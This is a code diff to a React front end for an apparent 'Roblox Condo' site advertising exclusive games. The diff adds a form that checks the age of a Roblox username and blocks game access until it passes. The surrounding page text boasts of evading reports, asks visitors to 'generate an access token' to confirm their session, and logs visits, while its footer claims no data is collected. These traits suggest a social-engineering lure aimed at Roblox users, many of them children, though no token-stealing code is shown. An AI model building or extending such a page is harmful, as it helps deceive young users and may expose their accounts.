@@ -3,6 +3,7 @@ import { ArrowRight, Check, ChevronDown, CircleHelp, Copy, Globe2, Heart, Info, 
 
 type Language = 'en' | 'es' | 'pt' | 'ru';
 type Game = { id: string; name: string; description: string; tag: string; banner: string; icon: typeof Zap; url: string };
+type VerifiedAccount = { username: string; accountAgeDays: number };
 
 const copy = {
   en: {
@@ -29,6 +30,7 @@ const copy = {
     choose: 'Choose your language',
     chooseNote: 'Select a language to continue to Roblox Condo.',
     language: 'Language',
+    loginTitle: 'Verify your Roblox account', loginNote: 'Enter your public Roblox username. We never ask for your password.', usernamePlaceholder: 'Roblox username', verify: 'Verify account', verifying: 'Checking account…', accountNotFound: 'Account not found. Try another username.', accountTooYoung: (days: number) => `This account is not old enough yet. ${days} day${days === 1 ? '' : 's'} remaining to reach 80 days.`, accountVerified: 'Account verified.', verifyError: 'Could not verify the account. Try again.', loginRequired: 'Verify your account before opening a game.',
   },
   es: {
     welcome: 'Bienvenido al Condo',
@@ -49,7 +51,7 @@ const copy = {
     subtitle: 'Лучшее место для эксклюзивных игр Roblox. Выбери игру, врывайся и побеждай.',
     featured: 'Избранные игры', available: '4 игры доступны', action: 'Экшн', social: 'Социальное', combat: 'Боевое', exclusive: 'Эксклюзив', play: 'Играть',
     entry: 'Требования для входа', account: 'Аккаунты моложе 80 дней', security: 'Наша игра использует продвинутые боты безопасности для защиты от жалоб и обеспечения безопасного опыта.', note: 'не могут присоединиться, чтобы предотвратить злоупотребления и сохранить наши серверы.',
-    generate: 'Создайте свой', tokenNote: 'ниже, чтобы подтвердить сессию и войти в игру.', generateAccess: 'Создать токен доступа', access: 'Войти в игру', copied: 'Токен скопирован', generated: 'Токен доступа создан', warning: 'Сначала создайте токен, чтобы войти в игру.', choose: 'Выберите язык', chooseNote: 'Выберите язык, чтобы продолжить.', language: 'Язык',
+    generate: 'Создайте свой', tokenNote: 'ниже, чтобы подтвердить сессию и войти в игру.', generateAccess: 'Создать токен доступа', access: 'Войти в игру', copied: 'Токен скопирован', generated: 'Токен доступа создан', warning: 'Сначала создайте токен, чтобы войти в игру.', choose: 'Выберите язык', chooseNote: 'Выберите язык, чтобы продолжить.', language: 'Язык', loginTitle: 'Verify your Roblox account', loginNote: 'Enter your public Roblox username. We never ask for your password.', usernamePlaceholder: 'Roblox username', verify: 'Verify account', verifying: 'Checking account…', accountNotFound: 'Account not found. Try another username.', accountTooYoung: (days: number) => `${days} days remaining to reach 80 days.`, accountVerified: 'Account verified.', verifyError: 'Could not verify the account. Try again.', loginRequired: 'Verify your account before opening a game.',
   },
 } as const;
 
@@ -69,6 +71,10 @@ function App() {
   const [selected, setSelected] = useState<Game | null>(null);
   const [token, setToken] = useState('');
   const [toast, setToast] = useState('');
+  const [username, setUsername] = useState('');
+  const [verifiedAccount, setVerifiedAccount] = useState<VerifiedAccount | null>(null);
+  const [verificationError, setVerificationError] = useState('');
+  const [isVerifying, setIsVerifying] = useState(false);
   const t = copy[language];
 
   const games = useMemo<Game[]>(() => [
@@ -88,6 +94,33 @@ function App() {
     void fetch('/api/log-visit', { method: 'POST', keepalive: true }).catch(() => undefined);
   }, []);
 
+
+  async function verifyRobloxAccount(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    const trimmedUsername = username.trim();
+    if (!trimmedUsername || isVerifying) return;
+    setIsVerifying(true);
+    setVerificationError('');
+    try {
+      const response = await fetch('/api/verify-roblox', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ username: trimmedUsername }),
+      });
+      const result = await response.json();
+      if (!response.ok) {
+        setVerificationError(result.error === 'not_found' ? t.accountNotFound : result.error === 'too_young' ? t.accountTooYoung(result.daysRemaining) : t.verifyError);
+        return;
+      }
+      setVerifiedAccount({ username: result.username, accountAgeDays: result.accountAgeDays });
+      setToast(t.accountVerified);
+    } catch {
+      setVerificationError(t.verifyError);
+    } finally {
+      setIsVerifying(false);
+    }
+  }
+
   function changeLanguage(next: Language) {
     setLanguage(next);
     localStorage.setItem('rc2_lang', next);
@@ -95,6 +128,10 @@ function App() {
   }
 
   function openGame(game: Game) {
+    if (!verifiedAccount) {
+      setToast(t.loginRequired);
+      return;
+    }
     setSelected(game);
     setToken('');
   }
@@ -180,6 +217,25 @@ function App() {
       </main>
 
       <footer className="footer"><div className="container footer-inner"><span>Roblox Condo</span><span className="footer-note">visual preview / no data collected</span></div></footer>
+
+
+      {!verifiedAccount && !showLanguage && (
+        <div className="modal-backdrop" role="presentation">
+          <div className="modal login-modal" role="dialog" aria-modal="true" aria-labelledby="login-title">
+            <div className="modal-content">
+              <div className="section-kicker">00 / account check</div>
+              <h2 className="modal-title" id="login-title">{t.loginTitle}</h2>
+              <p className="modal-copy">{t.loginNote}</p>
+              <form onSubmit={verifyRobloxAccount}>
+                <label className="login-label" htmlFor="roblox-username">{t.usernamePlaceholder}</label>
+                <input id="roblox-username" className="login-input" value={username} onChange={(event) => setUsername(event.target.value)} autoComplete="off" maxLength={20} placeholder={t.usernamePlaceholder} />
+                {verificationError && <p className="login-error" role="alert">{verificationError}</p>}
+                <button className="primary-button" type="submit" disabled={isVerifying || !username.trim()}>{isVerifying ? t.verifying : t.verify}</button>
+              </form>
+            </div>
+          </div>
+        </div>
+      )}
 
       {selected && (
         <div className="modal-backdrop" role="presentation" onMouseDown={(event) => event.target === event.currentTarget && setSelected(null)}>
